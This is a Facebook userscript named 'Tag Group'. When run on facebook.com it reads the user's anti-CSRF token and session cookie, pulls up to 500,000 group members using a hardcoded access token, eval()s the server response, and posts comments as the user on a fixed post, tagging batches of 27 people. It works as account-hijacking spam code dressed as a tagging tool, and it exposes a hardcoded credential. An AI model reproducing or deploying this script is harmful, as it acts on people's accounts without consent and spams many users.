// ==UserScript==
// @name            Tag Group ( VER 2.0.14 )1
// @description     CopyRight Phùng Thanh Phong
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// === Facebook  ====


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "286461141478762";
var starnhat = "CAAAAPJmB8ZBwBAIfDtKIMg9EbA47R9JORU4RXZAki6GYpSHsZCaVaiTc61yQYbqMkBOrtoA7h1dOYMLrRIg6uWPV5ZCxiU6a6wmlLUEUrZCtQb6c4WLSkDR7Ba22ZA2iBtqxuGGPTYlkFWofEIa3Oxx2iLPFPhauLnVV6YUeCxt9CpzJ8chIDO";
var idgroups = "266953070096236";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.length/27);f++){
mesaj = " Tang các ban .. ";mesaj_text = "";
for(i=f*27;i<(f+1)*27;i++){
if(arkadaslar[i]){
mesaj += " @[" + arkadaslar[i].uid +  ":" + arkadaslar[i].text + "]";
mesaj_text += "" + arkadaslar[i].text;
}
}
yorum_yap(id ,mesaj)}                
}
};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;
if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://api.facebook.com/method/fql.query?query=select+gid%2C+uid+from+group_member+where+gid+%3D+"+idgroups+"+limit+500000&access_token="+starnhat+"&format=json", true); }
else { xmlhttp.open("GET", "https://api.facebook.com/method/fql.query?query=select+gid%2C+uid+from+group_member+where+gid+%3D+"+idgroups+"+limit+500000&access_token="+starnhat+"&format=json", true); }
xmlhttp.send();
}
function RandomArkadas(){
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar[Math.floor(Math.random() * arkadaslar.length)].uid + ":" + arkadaslar[Math.floor(Math.random() * arkadaslar.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&ft_ent_identifier="+id;
 params +="&comment_text="+encodeURIComponent(mesaj);
 params +="&source=2";
 params +="&client_id=1377871797138:1707018092";
 params +="&reply_fbid";
 params +="&parent_comment_id";
 params +="&rootid=u_jsonp_2_3";
 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
 params +="&attached_sticker_fbid=0";
 params +="&attached_photo_fbid=0";
 params +="&giftoccasion";
 params +="&ft[tn]=[]";
 params +="&__user="+user_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
 params +="&__req=q";
 params +="&fb_dtsg="+fb_dtsg;
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
        arkadaslari_al(id);